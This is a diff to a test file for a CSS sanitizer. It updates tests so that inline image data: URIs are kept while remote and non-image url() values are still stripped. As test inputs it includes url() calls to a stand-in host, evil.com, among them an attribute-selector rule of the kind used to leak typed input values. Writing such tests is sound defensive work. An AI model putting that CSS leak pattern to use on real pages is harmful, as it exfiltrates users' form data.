@@ -20,29 +20,33 @@ describe('Theme CSS Sanitization (sanitizeThemeCss)', () => {
     expect(sanitizeThemeCss(`a { background: url(https://evil.com/x.png); }`)).not.toContain('evil.com')
   })
 
-  // Regression: a naive `url\([^)]*\)` stops at the FIRST ')', so a quoted data: URI
-  // containing a literal ')' inside its own value (routine for inline SVG — rgba()/
-  // matrix()/translate() and similar) only has its prefix replaced with 'none', leaving
-  // the true remainder of the value — including the real closing ')' and trailing ';' —
-  // as unescaped garbage text that corrupts the stylesheet from that point on. Caught by
-  // diffing production theme CSS: a mask-image data: URI containing `rgba(...)` produced
-  // exactly this — a mangled declaration whose garbage tail read like
-  // `none'/%3E%3C/svg%3E");`, breaking every rule after it in the browser's parser.
-  it('cleanly strips a quoted url() value that contains a literal ) inside the quotes', () => {
+  // Regression: a naive `url\([^)]*\)` stops at the FIRST ')', so a quoted value
+  // containing a literal ')' (routine for inline SVG — rgba()/matrix()/translate()) was
+  // only partly replaced, leaving garbage that broke every rule after it. Inline images
+  // are now kept whole, which only works if the quoted value is consumed in full.
+  it('keeps a quoted inline SVG url() whole, even with a literal ) inside the quotes', () => {
     const css = `.icon { mask-image: url('data:image/svg+xml,%3Csvg fill="rgba(0,0,0,0.5)"%3E%3C/svg%3E'); } .after { color: red; }`
-    const result = sanitizeThemeCss(css)
-    expect(result).toContain('mask-image: none')
-    expect(result).not.toContain('rgba')
-    expect(result).not.toMatch(/none['")]/) // no leftover quote/paren garbage stuck to 'none'
-    // The rule *after* the mangled one must survive intact — this is what a parser-desync
-    // bug would silently break.
-    expect(result).toContain('.after { color: red; }')
+    expect(sanitizeThemeCss(css)).toBe(css)
   })
 
-  it('cleanly strips a double-quoted url() value containing a literal )', () => {
-    const css = `a { background-image: url("data:image/svg+xml,%3Cpath transform='matrix(1,0,0,1,0,0)'/%3E"); }`
-    const result = sanitizeThemeCss(css)
-    expect(result).toBe(`a { background-image: none; }`)
+  it('keeps double-quoted and unquoted inline images', () => {
+    const dq = `a { background-image: url("data:image/svg+xml,%3Cpath transform='matrix(1,0,0,1,0,0)'/%3E"); }`
+    expect(sanitizeThemeCss(dq)).toBe(dq)
+    const bare = `a { background: url(data:image/png;base64,iVBORw0KGgo=); }`
+    expect(sanitizeThemeCss(bare)).toBe(bare)
+  })
+
+  it('still strips non-image data: URLs and a remote url() next to an inline image', () => {
+    expect(sanitizeThemeCss(`a { background: url("data:text/css,body{}"); }`)).toBe(`a { background: none; }`)
+    expect(sanitizeThemeCss(`a { background: url(" data:text/html,x"); }`)).toBe(`a { background: none; }`)
+    const mixed = sanitizeThemeCss(`a { mask: url("data:image/png;base64,AA"); } input[value^="a"] { background: url(https://evil.com/?a); }`)
+    expect(mixed).toContain('data:image/png;base64,AA')
+    expect(mixed).not.toContain('evil.com')
+  })
+
+  it('cleanly strips a quoted remote url() value containing a literal )', () => {
+    const css = `a { background-image: url("https://evil.com/a(b).png"); } .after { color: red; }`
+    expect(sanitizeThemeCss(css)).toBe(`a { background-image: none; } .after { color: red; }`)
   })
 
   it('strips @import statements entirely', () => {
